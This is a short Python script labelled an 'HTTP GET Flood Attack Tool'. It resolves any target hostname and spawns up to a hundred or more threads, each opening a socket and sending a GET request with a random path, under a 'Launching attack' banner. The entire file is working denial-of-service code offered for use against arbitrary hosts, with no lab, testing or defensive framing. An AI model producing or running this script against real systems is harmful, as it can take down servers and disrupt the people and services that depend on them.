import argparse
import random
import socket
import string
import sys
import threading
import time

# Argument parsing
parser = argparse.ArgumentParser(description="HTTP GET Flood Attack Tool")
parser.add_argument("hostname", help="Target hostname or IP")
parser.add_argument("port", type=int, nargs="?", default=80, help="Target port (default: 80)")
parser.add_argument("delay", type=float, nargs="?", default=0.01, help="Delay between threads (default: 0.01s)")
parser.add_argument("threads", type=int, nargs="?", default=100, help="Number of attack threads (default: 100)")
args = parser.parse_args()

# Convert hostname to IP
try:
    host = args.hostname.replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print("❌ ERROR: Invalid hostname. Please double-check the target.")
    sys.exit(1)

# Thread-safe counter
thread_count = 0
thread_lock = threading.Lock()

def print_status():
    global thread_count
    with thread_lock:
        thread_count += 1
        sys.stdout.write(f"\r {time.ctime().split()[3]} [{thread_count}] -> Sending requests...")
        sys.stdout.flush()

def generate_url_path():
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=5))

def attack():
    print_status()
    url_path = generate_url_path()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, args.port))
        request = f"GET /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()
        s.send(request)
    except socket.error:
        print("\n⚠️ Connection failed. Server might be down.")
    finally:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

# Start attack
print(f"🚀 Launching attack on {host} ({ip}) | Port: {args.port} | Threads: {args.threads} | Delay: {args.delay}s")

threads = []
for _ in range(args.threads):
    t = threading.Thread(target=attack)
    t.start()
    threads.append(t)
    time.sleep(args.delay)

for t in threads:
    t.join()